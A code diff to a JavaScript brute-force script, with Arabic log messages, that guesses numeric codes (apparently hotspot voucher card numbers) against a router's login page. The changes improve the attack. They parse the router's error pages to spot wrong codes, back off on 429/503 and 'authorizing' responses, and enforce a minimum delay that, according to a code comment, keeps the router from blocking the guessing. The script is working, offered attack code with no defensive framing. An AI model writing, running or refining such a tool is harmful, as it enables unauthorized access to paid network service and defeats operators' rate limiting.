@@ -65,9 +65,9 @@
             const statusUrl = base + '/status?var=callBack';
             const loginUrl = base + '/login';
 
-            log('▶ بدء التخمين (مع حفظ التقدم)');
+            log('▶ بدء التخمين (مع قراءة ردود الراوتر)');
             const tried = new Set(CFG.tried || []);
-            log('  تم تجربة ' + tried.size + ' رقم سابقاً في هذه الشبكة');
+            log('  تم تجربة ' + tried.size + ' رقم سابقاً');
             
             const init = await safeJson(statusUrl);
             if (init && isActive(init)) {
@@ -96,7 +96,7 @@
 
             const maxVal = Math.pow(10, CFG.digits) - 1;
             if (tried.size > maxVal) {
-                log('⚠ تم استنفاد جميع الأرقام الممكنة لهذه الشبكة!');
+                log('⚠ تم استنفاد جميع الأرقام الممكنة!');
                 return;
             }
 
@@ -106,12 +106,14 @@
             let done = 0;
             let batchCount = 0;
             
+            // إجبار التأخير ليكون 200ms على الأقل حتى لا يغلق الراوتر
+            const USER_DELAY = CFG.pause || 300;
+            const DELAY_MIN = Math.max(200, USER_DELAY); 
+            const DELAY_MAX = DELAY_MIN * 2;
             const MAX_CONCURRENT = CFG.threads || 3;
-            const DELAY_MIN = CFG.pause || 300;
-            const DELAY_MAX = DELAY_MIN * 4;
             const BATCH_SIZE = CFG.statusEvery || 50;
             const BATCH_REST = 5000;
-            const RETRY_DELAY = CFG.retryDelay || 1000;
+            const RETRY_DELAY = CFG.retryDelay || 1500;
 
             function gen() {
                 for (let k = 0; k < 1000; k++) {
@@ -148,26 +150,37 @@
                     });
                     clearTimeout(timeoutId);
                     
-                    let isBad = false;
-                    const loc = r.headers.get('Location') || '';
                     let text = '';
-                    
                     if (r.status !== 302 && r.status !== 301) {
                         text = await r.text();
                     }
                     
-                    // قراءة الرد لمعرفة إذا كان الكرت خاطئ
-                    const combined = (loc + ' ' + text).toLowerCase();
-                    if (combined.includes('error') || combined.includes('fail') || 
-                        combined.includes('invalid') || combined.includes('denied') || 
-                        combined.includes('wrong') || combined.includes('incorrect')) {
-                        isBad = true;
+                    let errMsg = '';
+                    let isBad = false;
+                    
+                    if (text) {
+                        // استخراج رسالة الخطأ من صفحة الراوتر
+                        const match = text.match(/class="[^"]*(?:error|fail|alert|info)[^"]*"[^>]*>([^<]+)</i) || 
+                                      text.match(/<div[^>]*style="[^"]*color:\s*red[^"]*"[^>]*>([^<]+)</i);
+                        if (match && match[1]) {
+                            errMsg = match[1].trim();
+                        } else {
+                            const stripped = text.replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim();
+                            if (stripped.toLowerCase().includes('authorizing')) {
+                                errMsg = 'already authorizing, retry later';
+                            } else if (stripped.toLowerCase().includes('invalid') || stripped.toLowerCase().includes('error') || stripped.toLowerCase().includes('fail')) {
+                                const idx = Math.max(0, stripped.toLowerCase().indexOf('error') - 20);
+                                errMsg = stripped.substring(idx, idx + 80).trim();
+                            }
+                        }
+                        
+                        if (errMsg) isBad = true;
                     }
                     
-                    return { v, code: r.status, isBad };
+                    return { v, code: r.status, text, errMsg, isBad };
                 } catch(e) {
                     clearTimeout(timeoutId);
-                    return { v, code: 0, isBad: true };
+                    return { v, code: 0, errMsg: 'Network Error', isBad: true };
                 }
             }
 
@@ -198,9 +211,26 @@
                 batchCount += batch.length;
                 const results = await Promise.all(batch);
 
-                const limited = results.some(r => r.code === 429 || r.code === 503);
-                if (limited) {
-                    log('🛑 حظر — انتظار ' + (RETRY_DELAY/1000) + ' ثانية...');
+                let routerBusy = false;
+
+                for (const r of results) {
+                    if (r.code === 429 || r.code === 503) {
+                        log('🛑 حظر من الراوتر (كود ' + r.code + ')');
+                        routerBusy = true;
+                    } else if (r.code === 0) {
+                        log('⚠ خطأ شبكة: ' + r.v);
+                    } else if (r.isBad) {
+                        if (r.errMsg.toLowerCase().includes('authorizing')) {
+                            log('🛑 ' + r.v + ' → الراوتر قال: ' + r.errMsg);
+                            routerBusy = true;
+                        } else {
+                            log('❌ ' + r.v + ' → ' + r.errMsg);
+                        }
+                    }
+                }
+
+                if (routerBusy) {
+                    log('⏳ الراوتر مشغول أو يحظر المحاولات. انتظار ' + (RETRY_DELAY/1000) + ' ثانية...');
                     await sleep(RETRY_DELAY);
                 }
 
